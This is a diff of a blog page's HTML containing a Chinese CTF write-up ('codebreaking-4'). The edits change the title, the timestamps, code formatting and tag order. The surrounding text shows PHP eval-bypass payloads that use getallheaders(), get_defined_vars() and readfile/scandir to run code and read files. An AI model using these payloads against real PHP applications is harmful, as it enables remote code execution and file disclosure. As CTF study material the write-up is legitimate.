@@ -7,7 +7,7 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>codebreaking-4 | ddddhm | glotozz&#39;blog</title>
+  <title>codebreaking-4 | 低效率的勤奋是鸦片 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
@@ -16,13 +16,13 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="codebreaking-4">
 <meta property="og:url" content="https://glotozz.github.io/2019/08/15/codebreaking-4/index.html">
-<meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
+<meta property="og:site_name" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
 <meta property="og:description" content="新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://ws4.sinaimg.cn/large/006Xmmmggy1g602f3ikdoj314r0eydmc.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/006Xmmmggy1g602n5s75uj31000arafr.jpg">
 <meta property="og:image" content="https://ws4.sinaimg.cn/large/006Xmmmggy1g60305juohj30z40fl7bn.jpg">
-<meta property="og:updated_time" content="2019-09-09T06:27:46.803Z">
+<meta property="og:updated_time" content="2019-09-19T11:04:22.146Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="codebreaking-4">
 <meta name="twitter:description" content="新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘">
@@ -190,7 +190,8 @@
 </blockquote>
 <p>原理是利用php的getallheaders()，我们可以通过设置ua来传入字符串，成功执行我想要的命令。这里我们先看看phpinfo的内容。</p>
 <p>payload：</p>
-<p>?code=eval(implode(array_reverse(getallheaders())));</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(implode(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure>
+
 <p>在headers的Host上面一行添加</p>
 <p>1: phpinfo();//</p>
 <p><img src="https://ws4.sinaimg.cn/large/006Xmmmggy1g602f3ikdoj314r0eydmc.jpg" alt="1565829520609"></p>
@@ -206,7 +207,8 @@
 <p><strong>get_defined_vars()</strong>返回所有已定义变量所组成的数组，这个已定义的变量里就包括了<code>$_GET</code>、<code>$_POST</code>等我们可以控制的变量，所以把要执行的代码写在其他的get参数里即可</p>
 </blockquote>
 <p>构造payload：</p>
-<p>?aa=phpinfo();//&amp;code=eval(implode(reset(get_defined_vars())));</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aa=phpinfo();//&amp;code=eval(implode(reset(get_defined_vars())));</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://ws4.sinaimg.cn/large/006Xmmmggy1g60305juohj30z40fl7bn.jpg" alt="1565830724944"></p>
 <p>附上另一个大师傅的payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
@@ -481,7 +483,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -489,11 +495,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">wp</a>
+                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -521,11 +523,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">start</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">start</a>
+                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -534,10 +540,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
               </li>
              
               <li class="article-tag-list-item">
